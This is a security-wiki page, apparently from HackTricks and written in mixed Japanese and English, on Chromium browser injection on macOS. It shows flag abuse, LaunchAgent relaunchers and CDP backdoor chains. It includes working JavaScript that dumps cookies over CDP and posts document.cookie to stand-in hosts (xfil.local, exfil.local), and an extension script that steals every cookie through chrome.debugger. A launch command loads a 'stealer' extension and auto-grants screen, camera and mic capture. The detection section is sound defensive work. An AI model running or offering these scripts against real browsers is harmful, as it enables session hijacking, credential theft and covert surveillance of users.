# macOS Chromium Injection

{{#include ../../../banners/hacktricks-training.md}}

## 基本情報

Google Chrome、Microsoft Edge、Brave、Arc、Vivaldi、Opera などの Chromium-based browser は、同じ command-line switches、preference files、DevTools automation interfaces を使用します。macOS では、GUI access を持つすべての user が既存の browser session を終了し、target の entitlements で実行される任意の flags、extensions、DevTools endpoints を指定して再起動できます。

#### macOS で custom flags を指定して Chromium を起動する

macOS は Chromium profile ごとに単一の UI instance を維持するため、通常 instrumentation には browser の force-close が必要です（たとえば `osascript -e 'tell application "Google Chrome" to quit'`）。Attackers は通常、`open -na "Google Chrome" --args <flags>` で再起動し、app bundle を変更せずに arguments を inject します。この command を user LaunchAgent（`~/Library/LaunchAgents/*.plist`）または login hook 内で wrap すると、reboot/logoff 後に tampered browser が確実に respawn されます。

#### `--load-extension` Flag

`--load-extension` flag は unpacked extensions（comma-separated paths）を auto-load します。`--disable-extensions-except` と組み合わせることで、legitimate extensions を block し、payload のみを強制的に実行できます。Malicious extensions は `debugger`、`webRequest`、`cookies` などの high-impact permissions を要求し、DevTools protocols への pivot、CSP headers の patch、HTTPS の downgrade、browser 起動直後の session material の exfiltrate を実行できます。<sup>[[4]](#references)</sup>

#### `--remote-debugging-port` / `--remote-debugging-pipe` Flags

これらの switches は Chrome DevTools Protocol（CDP）を TCP または pipe 経由で expose し、external tooling から browser を操作できるようにします。Google はこの interface を利用した infostealer abuse の広がりを確認しており、Chrome 136（March 2025）以降、browser が non-standard な `--user-data-dir` で起動されない限り、default profile に対する switches は無視されます。これにより real profiles では App-Bound Encryption が適用されますが、attackers は依然として fresh profile を spawn し、victim にその中で authenticate するよう誘導し（phishing/triage assistance）、CDP 経由で cookies、tokens、device trust states、WebAuthn registrations を harvest できます。<sup>[[5]](#references)</sup>

#### `--user-data-dir` Flag

この flag は browser profile 全体（History、Cookies、Login Data、Preference files など）を attacker-controlled path に redirect します。modern Chrome builds で `--remote-debugging-port` と組み合わせる場合に必須であり、tampered profile を isolate することで、security prompts を disable し、extensions を auto-install し、default schemes を変更する pre-populated `Preferences` または `Secure Preferences` files を配置できます。

#### `--use-fake-ui-for-media-stream` Flag

この switch は camera/mic の permission prompt を bypass するため、`getUserMedia` を呼び出す page は即座に access を取得します。`--auto-select-desktop-capture-source="Entire Screen"`、`--kiosk` などの flags、または CDP の `Browser.grantPermissions` commands と組み合わせることで、user interaction なしに audio/video の capture、desk-share、WebRTC permission checks の充足を行えます。<sup>[[4]](#references)</sup>

## 実際に確認されている Delivery & Relaunch Patterns

CDP abuse は通常、initial payload ではなく **post-exploitation** stage です。最近の macOS developer-targeting campaign では、poisoned Xcode **`Run Script` build phase**（`PBXShellScriptBuildPhase`）が使用され、victim が project を **built** したときのみ code が実行され、単に clone または open しただけでは実行されませんでした。最初の execution 後、malware は他の `.xcodeproj` trees にも感染し、malicious Git `pre-commit` hooks を追加し、ZIP archives 内からさらに Xcode projects を search しました。<sup>[[3]](#references)</sup>

Chromium abuse では、attacker が browser binary 自体を patch する必要がないため、これは重要です。短時間だけ実行される build-phase / `osascript` stager は、代わりに **browser wrapper**（LaunchAgent、login item、Dock entry、trojanized app launcher など）を install し、user が起動するたびに attacker-controlled flags 付きで legitimate browser を reopen できます。<sup>[[3]](#references)</sup>

> [!TIP]
> Developer endpoints では、`.pbxproj` files、`.git/hooks/pre-commit`、および `.xcodeproj` を含む ZIPs を確認し、予期しない `curl`、`osascript`、`xxd`、nested `base64`、または Chrome relaunch logic がないか調べてください。

## Remote Debugging & DevTools Protocol Abuse

Chrome を専用の `--user-data-dir` および `--remote-debugging-port` 付きで relaunch すると、CDP 経由（たとえば `chrome-remote-interface`、`puppeteer`、`playwright`）で attach し、high-privilege workflows を script 化できます。

- **Cookie/session theft:** `Network.getAllCookies` と `Storage.getCookies` は、App-Bound encryption により通常は filesystem access が block される場合でも HttpOnly values を返します。これは CDP が実行中の browser に decrypt を要求するためです。
- **Permission tampering:** `Browser.grantPermissions` と `Emulation.setGeolocationOverride` により、camera/mic prompts を bypass（特に `--use-fake-ui-for-media-stream` と組み合わせた場合）したり、location-based security checks を falsify したりできます。
- **Keystroke/script injection:** `Runtime.evaluate` は active tab 内で任意の JavaScript を実行し、credential lifting、DOM patching、または navigation 後も survive する persistence beacons の inject を可能にします。<sup>[[1]](#references)</sup>
- **Live exfiltration:** `Network.webRequestWillBeSentExtraInfo` と `Fetch.enable` は、disk artifacts に触れることなく、authenticated requests/responses を real time で intercept します。
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Because Chrome 136 は default profile 上の CDP を block するため、被害者が既に使用している `~/Library/Application Support/Google/Chrome` directory を staging path に copy/paste しても、もはや cookies を decrypted できません。代わりに、instrumented profile 内で authentication するよう user を social-engineer します（例：「helpful」な support session）。または、CDP-controlled network hooks を介して transit 中の MFA tokens を capture します。<sup>[[5]](#references)</sup>

### XCSSET-style CDP Backdoor Chain

実用的な malware pattern は次のとおりです。

1. Chrome が launch されるたびに、userland implant または wrapper を restart します。
2. `--remote-debugging-port=<port>` と、Chrome 136 以降では通常、組み合わせた non-default `--user-data-dir=<dir>` を指定して、legitimate browser を spawn します。
3. local CDP WebSocket に connect し、`Page.addScriptToEvaluateOnNewDocument` で pre-document hook を register する helper を start します。<sup>[[2]](#references)</sup>

この helper は site code が run する **前** に JavaScript を inject できます。そのため、disk 上の files に patch を適用せずに、`window.fetch`、`XMLHttpRequest`、wallet providers、または autofill flows を hook するのに適しています。<sup>[[3]](#references)</sup>
```javascript
await Page.enable();
await Runtime.enable();
await Page.addScriptToEvaluateOnNewDocument({
source: `
const oldFetch = window.fetch;
window.fetch = async (...args) => {
console.log('__HT__' + JSON.stringify(args[0]));
return oldFetch(...args);
};
`
});
Runtime.consoleAPICalled(({args}) => { /* helper parses __HT__ */ });
```
より強力な亜種では、browserを**host command bridge**に変えます。注入された JavaScript がdelimiter付きの`console.log`を出力し、ローカルヘルパーが`Runtime.consoleAPICalled`を監視してmarkerを削除し、残りの内容をhost shell（例えば Go の`exec.Command`）で実行し、攻撃者の WebSocket 経由で stdout/stderr を返します。これにより、tabレベルの script execution が、ほぼ fileless reverse shellへと拡張されます。<sup>[[3]](#references)</sup>

## Extension-Based Injection via Debugger API

2023年の「Chrowned by an Extension」研究では、悪意のある extension が`chrome.debugger` APIを使用して任意のtabにattachし、`--remote-debugging-port`と同じDevTools権限を取得できることが実証されました。<sup>[[6]](#references)</sup>これにより、従来のisolationに関する前提（extensionsは自身のcontext内に留まる）が破られ、以下が可能になります。

- `Network.getAllCookies`/`Fetch.getResponseBody`による、ユーザーに気付かれにくいcookieおよびcredentialの窃取。
- site permissions（camera、microphone、geolocation）の変更とsecurity interstitialのbypass。これにより、phishing pageがChromeのdialogを偽装できます。
- `Page.handleJavaScriptDialog`、`Page.setDownloadBehavior`、または`Security.handleCertificateError`をプログラムで操作し、TLS warning、download、またはWebAuthn promptをon-path tamperingすること。

`--load-extension`/`--disable-extensions-except`を使用してextensionをloadすれば、ユーザーの操作は必要ありません。APIをweaponizeする最小限のbackground scriptは次のようになります。
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
この extension は `Debugger.paused` events を subscribe して、JavaScript variables の読み取り、inline scripts の patch、または navigation 後も存続する custom breakpoints の設定を行うこともできます。すべてがユーザーの GUI session 内で実行されるため、Gatekeeper と TCC は trigger されません。そのため、この technique はすでに user context で execution を獲得した malware に最適です。<sup>[[6]](#references)</sup>

## Detection & Hunting

- `--remote-debugging-port`、`--remote-debugging-pipe`、または suspicious な `--user-data-dir` を付けて起動された Chromium browsers を alert します。特に parent が `bash`、`sh`、`osascript`、`xcodebuild`、または LaunchAgent helper の場合は注意が必要です。
- helper が local CDP WebSocket を開き、`Page.addScriptToEvaluateOnNewDocument` を register した後、long-lived な outbound WebSocket/HTTPS connection を確立する短い chain を探します。
- browser の `Runtime.consoleAPICalled` activity と、attacker-supplied commands を実行する child shells または helper processes を correlate して、console-to-shell bridges を Hunting します。
- developer Macs では、`.pbxproj` の `PBXShellScriptBuildPhase` entries、Git の `pre-commit` hooks、Dock/login item relaunchers、および ZIP に含まれる Xcode projects を確認し、browser wrapper installation を調査します。
```bash
ps auxww | rg 'Chrome|Brave|Edge.*(--remote-debugging-port|--remote-debugging-pipe|--user-data-dir)'
lsof -nP -iTCP -sTCP:LISTEN | rg 'Chrome|Brave|Edge'
find ~/Library/LaunchAgents /Library/LaunchAgents -name '*.plist' -exec plutil -p {} \; 2>/dev/null | rg 'remote-debugging|Google Chrome|Brave|Edge'
rg -n 'PBXShellScriptBuildPhase|curl|osascript|xxd|base64' ~/Code --glob '*.pbxproj'
```
### ツール

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - payload extensions を使用した Chromium の起動を自動化し、インタラクティブな CDP hooks を公開します。
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - macOS operators 向けに、traffic interception と browser instrumentation に特化した同様のツールです。
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - `--remote-debugging-port` インスタンスが起動した後に、Chrome DevTools Protocol のダンプ（cookies、DOM、permissions）をスクリプト化する Node.js library です。

### 例
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
tools linksでさらに多くの例を確認できます。

## 参考資料

- [1] [Chrome DevTools Protocol - Runtime domain](https://chromedevtools.github.io/devtools-protocol/v8/Runtime/)
- [2] [Chrome DevTools Protocol - Page domain](https://chromedevtools.github.io/devtools-protocol/tot/Page/)
- [3] [The Xcode Assassin Returns: A Deep Dive Into the Latest XCSSET Version - Unit 42](https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/)
- [4] [Ron Masas (@RonMasas) on X](https://twitter.com/RonMasas/status/1758106347222995007)
- [5] [Changes to remote debugging switches to improve security - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [6] [Chrowned by an Extension: Abusing the Chrome DevTools Protocol through the Debugger API (arXiv:2305.11506)](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
